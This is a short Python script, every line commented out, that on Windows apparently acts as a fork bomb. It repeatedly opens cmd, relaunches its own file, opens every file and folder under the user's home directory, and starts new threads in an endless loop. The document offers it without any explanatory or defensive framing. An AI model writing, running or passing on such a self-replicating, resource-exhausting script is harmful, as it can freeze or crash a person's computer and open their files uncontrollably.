# import os
# import platform
# import threading

# o = platform.system()
# print(o)

# main = os.path.expanduser('~')
# os.chdir(main)
# # # os.startfile("Application Data")
# # # exit()

# def f():
#     if o == "Windows":
#         while True:
#             os.startfile("cmd")
#             os.startfile(__file__)
#             a = os.listdir()
#             print(type(a))
#             for i in a:
#                 # print(i)
#                 if os.path.isdir(i):
#                     try:
#                         k = os.listdir(i+"/")
#                         # print(k)
#                         for l in k:
#                             a.append(l)
#                             print(a)
#                             os.startfile(i+"/")
#                     except:
#                         pass
                
#                 try:
#                     os.startfile(i)

#                 except:
#                     continue

#     else:
#         pass

# while True:
#     t = threading.Thread(target=f)
#     t.start()

# # # f()